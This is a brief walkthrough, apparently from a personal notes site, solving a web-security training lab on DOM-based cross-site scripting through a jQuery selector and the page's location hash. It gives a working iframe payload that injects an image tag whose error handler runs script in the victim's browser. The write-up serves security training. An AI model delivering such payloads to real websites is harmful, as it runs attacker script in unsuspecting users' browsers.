# Lab: DOM XSS in jQuery selector sink using a hashchange event

This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.

To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.

***

Notice the vulnerable code on the home page using Burp or the browser's DevTools.

From the lab banner, open the exploit server.

<figure><img src="../../../.gitbook/assets/image (811).png" alt=""><figcaption></figcaption></figure>

In the **Body** section, add the following malicious `iframe`:

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

<figure><img src="../../../.gitbook/assets/image (812).png" alt=""><figcaption></figcaption></figure>

We Solve The Lab FInally !

<figure><img src="../../../.gitbook/assets/image (813).png" alt=""><figcaption></figcaption></figure>
